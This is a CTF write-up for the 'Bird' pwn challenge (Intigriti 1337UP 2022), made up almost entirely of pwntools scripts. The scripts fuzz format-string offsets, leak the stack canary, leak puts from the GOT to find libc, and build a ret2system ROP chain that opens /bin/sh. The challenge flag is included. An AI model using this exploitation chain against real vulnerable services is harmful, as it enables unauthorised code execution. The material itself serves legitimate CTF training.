---
name: Bird (2022)
event: Intigriti 1337UP LIVE CTF 2022
category: Pwn
description: Writeup for Bird (Pwn) - Intigriti 1337UP LIVE CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Bird

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/XaWlKYgmEDs/0.jpg)](https://youtu.be/XaWlKYgmEDs "Intigriti 1337UP LIVE CTF 2022: Bird")

## Solution

#### fuzz.py

{% code overflow="wrap" %}
```py
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./bird', checksec=False)

# Let's fuzz x values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendlineafter(b':', 'c56500c7ab26a5100d4672cf18835690 c56500c7ab26a5100d4672cf18835690 %{}$p'.format(i).encode())
        sleep(0.1)
        p.recvuntil(b'singing:')
        # Receive the response
        result = p.recvlinesS(2)[0].split(" ")[-1:]
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
```
{% endcode %}

#### manual.py

{% code overflow="wrap" %}
```py
from pwn import *
from time import sleep

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './bird'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 88  # Canary offset

# Lib-C library
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

pop_rdi = 0x400d43  # Found with ropper
ret = 0x400606  # Stack alignment

# Leak values from the stack - The c56500c7ab26a5100d4672cf18835690 value found from static analysis/debugging
io.sendlineafter(
    b'Name your favorite bird:',
    'c56500c7ab26a5100d4672cf18835690 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p')

sleep(0.5)

# Canary value
io.recv()
leaked_addresses = io.recvS().split(" ")
canary = int(leaked_addresses[-9:-8][0][:18], 16)
info('canary = 0x%x (%d)', canary, canary)

# Build payload (leak puts)
payload = flat([
    offset * b'A',  # Pad to canary (88)
    canary,  # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    # Leak got.puts
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    elf.symbols.restart  # Return for 2nd payload
])

# Send the payload
io.sendline(payload)
io.recvlines(2)

# Retrieve got.puts address
got_puts = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Build payload (ret2system)
payload = flat([
    offset * b'A',  # Pad to canary (88)
    canary,  # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    # Ret2system
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    ret,  # Stack alignment
    libc.symbols.system
])

# Send the payload
io.sendline(payload)

# Get our flag/shell
io.interactive()
```
{% endcode %}

#### ropstar.py

{% code overflow="wrap" %}
```py
from pwn import *
from time import sleep

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './bird'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 88  # Canary offset

# Lib-C library
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

# Create ROP object from challenge binary
rop = ROP(elf)

ret = rop.find_gadget(['ret'])[0]  # Stack alignment

# Leak values from the stack - The c56500c7ab26a5100d4672cf18835690 value found from static analysis/debugging
io.sendlineafter(
    b'Name your favorite bird:',
    'c56500c7ab26a5100d4672cf18835690 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p')

sleep(0.5)

# Canary value
io.recv()
leaked_addresses = io.recvS().split(" ")
canary = int(leaked_addresses[-9:-8][0][:18], 16)
info('canary = 0x%x (%d)', canary, canary)

rop.puts(elf.got.puts)  # Leak got.puts
rop.restart()  # Return for 2nd payload

# Print ROP gadgets and ROP chain
# pprint(rop.gadgets)
# pprint(rop.dump())

# Build payload (leak puts)
payload = flat([
    offset * b'A',  # Pad to canary (88)
    canary,  # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    rop.chain()  # ROP chain
])

# Send the payload
io.sendline(payload)
io.recvlines(2)

# Retrieve got.puts address
got_puts = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Create ROP object from Lib-C
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))  # system('/bin/sh')

# Print ROP gadgets and ROP chain
# pprint(rop.gadgets)
# pprint(rop.dump())

# Build payload (ret2system)
payload = flat([
    offset * b'A',  # Pad to canary (88)
    canary,  # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    ret,  # Stack alignment
    rop.chain()  # ROP chain
])

# Send the payload
io.sendline(payload)

# Get our flag/shell
io.interactive()
```
{% endcode %}

Flag: `1337UP{W3_1ov3_C4n4r13s_7h47_r37urn_7o_l1bc}`
